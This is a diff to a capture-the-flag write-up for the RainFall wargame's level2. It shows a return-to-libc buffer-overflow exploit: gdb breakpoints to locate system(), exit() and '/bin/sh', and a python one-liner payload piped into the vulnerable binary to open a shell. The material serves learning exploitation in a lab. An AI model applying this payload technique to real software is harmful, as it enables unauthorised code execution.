@@ -66,9 +66,10 @@ We can already see that the program is **allocating 80 bytes, 76 for the string 
 ## Return to libc
 We will use the [**return to libc**](https://en.wikipedia.org/wiki/Return-to-libc_attack) type of attack that is not utiliying the stack but rather works with stuff already in process memory. We construct the attack using this flow
 ~~~
-overflow on offset -> mem address of system() -> mem address of "/bin/sh"
+overflow on offset -> p() return address -> mem address of system() -> exit() -> mem address of "/bin/sh"
 ~~~
-Using gdb's brakepoint, we will find what we need:
+Return address of **p()** is **0x0804853e**.
+Using gdb's brakepoint, we will find the rest of what we need:
 ~~~bash
 (gdb) b p
 Breakpoint 1 at 0x80484da
@@ -83,7 +84,7 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 ~~~
 Now we use this to construct the attack:
 ~~~bash
-level2@RainFall:~$ python -c 'print "F" * 80  + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1]' > /tmp/flag2
+level2@RainFall:~$  python -c 'print "F" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1]' > /tmp/flag2
 level2@RainFall:~$ cat /tmp/flag2 - | ./level2
 ~~~
 
